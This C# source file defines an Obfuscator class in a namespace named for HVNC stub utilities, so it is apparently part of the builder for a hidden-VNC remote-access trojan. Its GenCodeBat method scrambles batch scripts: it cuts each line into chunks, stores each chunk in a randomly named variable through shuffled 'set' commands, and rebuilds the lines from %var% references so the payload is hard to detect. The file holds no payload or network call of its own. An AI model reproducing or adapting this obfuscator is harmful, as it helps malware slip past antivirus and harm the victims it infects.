using System;
using System.Collections.Generic;
using System.Linq;

namespace BirdBrainmofo.HVNC.StubUtils
{
    public class Obfuscator
    {
        public static (string, string) GenCodeBat(string input, Random rng, int level = 5)
        {
            string text = string.Empty;
            string[] array = input.Split(new string[1] { Environment.NewLine }, StringSplitOptions.None);
            int num = 5;
            if (level > 1)
            {
                num -= level;
            }
            num *= 2;
            List<string> list = new List<string>();
            List<string[]> list2 = new List<string[]>();
            string[] array2 = array;
            foreach (string obj in array2)
            {
                List<string> list3 = new List<string>();
                string text2 = string.Empty;
                bool flag = false;
                string text3 = obj;
                for (int j = 0; j < text3.Length; j++)
                {
                    char c = text3[j];
                    if (c == '%')
                    {
                        flag = !flag;
                        text2 += c;
                        continue;
                    }
                    if (c == ' ' && flag)
                    {
                        flag = false;
                        text2 += c;
                        continue;
                    }
                    if (!flag && text2.Length >= num)
                    {
                        list3.Add(text2);
                        flag = false;
                        text2 = string.Empty;
                    }
                    text2 += c;
                }
                list3.Add(text2);
                List<string> list4 = new List<string>();
                foreach (string item in list3)
                {
                    string text4 = Utils.RandomString(10, rng);
                    list.Add("set \"" + text4 + "=" + item + "\"");
                    list4.Add(text4);
                }
                list2.Add(list4.ToArray());
            }
            list = new List<string>(list.OrderBy(string_0 => rng.Next()));
            for (int k = 0; k < list.Count; k++)
            {
                text += list[k];
                text = ((rng.Next(0, 2) == 0 || k == list.Count - 1) ? (text + Environment.NewLine) : (text + " & "));
            }
            string text5 = string.Empty;
            foreach (string[] item2 in list2)
            {
                for (int i = 0; i < item2.Length; i++)
                {
                    text5 = text5 + "%" + item2[i] + "%";
                }
                text5 += Environment.NewLine;
            }
            return (text.TrimEnd('\r', '\n'), text5.TrimEnd('\r', '\n'));
        }
    }
}
